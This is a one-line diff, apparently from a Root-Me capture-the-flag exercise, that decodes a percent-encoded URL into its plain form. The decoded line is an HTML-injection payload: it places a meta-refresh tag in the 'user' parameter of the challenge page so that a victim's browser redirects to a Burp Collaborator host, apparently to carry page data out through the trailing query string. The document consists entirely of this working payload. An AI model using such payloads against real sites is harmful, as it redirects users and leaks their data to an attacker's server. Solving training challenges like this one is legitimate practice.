@@ -1,1 +1,1 @@
-payload = http://challenge01.root-me.org:58029/page?user=%3c%6d%65%74%61%20%68%74%74%70%2d%65%71%75%69%76%3d%27%72%65%66%72%65%73%68%27%20%63%6f%6e%74%65%6e%74%3d%27%30%3b%68%74%74%70%73%3a%2f%2f%73%71%6d%38%72%79%70%34%64%36%64%62%77%73%77%36%31%39%67%62%61%76%67%74%74%6b%7a%69%6e%37%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f
+payload = http://challenge01.root-me.org:58029/page?user=<meta http-equiv='refresh' content='0;https://sqm8ryp4d6dbwsw619gbavgttkzin7.burpcollaborator.net?
